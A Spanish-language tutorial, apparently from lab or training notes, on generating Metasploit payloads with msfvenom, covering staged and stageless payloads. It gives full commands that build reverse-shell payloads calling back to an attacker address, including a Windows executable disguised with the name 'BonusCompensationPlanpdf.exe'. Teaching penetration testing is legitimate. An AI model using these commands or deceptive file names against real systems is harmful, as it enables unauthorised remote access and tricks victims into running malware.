
Con **MSFvenom** instalado, podemos listar todos los payloads disponibles con el comando:

```shells
msfvenom -l payloads

```
La salida nos muestra detalles importantes, como el sistema operativo objetivo (Linux, Windows, MacOS, etc.) y si el payload es **escalonado** (_staged_) o **no escalonado** (_stageless_).

### **Diferencias entre Payloads Escalonados y No Escalonados**

- **Escalonados (_Staged_):** Permiten enviar una carga inicial (_stage_) que, al ejecutarse, se comunica con el equipo atacante para descargar el resto del payload. Son útiles en redes con menos ancho de banda, pero ocupan más espacio en memoria, lo que puede ser una desventaja.

- **No escalonados (_Stageless_):** Se envían completos sin etapas adicionales. Son ideales en entornos con alta latencia o para evadir detección al minimizar el tráfico de red. Además, suelen ser más estables en conexiones inestables.


**Identificación de payloads:**

- Ejemplo de escalonado: `linux/x86/shell/reverse_tcp`
- Ejemplo de no escalonado: `linux/zarch/meterpreter_reverse_tcp`  
La diferencia principal radica en cómo están separados los componentes en el nombre.

### Construcción de un Payload No Escalonado
Payload para Linux

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
**Explicación del comando:**

- `-p linux/x64/shell_reverse_tcp`: Define un payload no escalonado para Linux que inicia una reverse shell.
- `LHOST=10.10.14.113 LPORT=443`: Dirección IP y puerto de la máquina atacante.
- `-f elf`: Genera un archivo en formato ELF (Linux).
- `> createbackup.elf`: Crea el archivo llamado `createbackup.elf`.

Payload para Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
**Explicación del comando:**

- `-p windows/shell_reverse_tcp`: Define un payload no escalonado para Windows.
- `-f exe`: Genera un archivo en formato `.exe`.
- `> BonusCompensationPlanpdf.exe`: Nombra el archivo generado.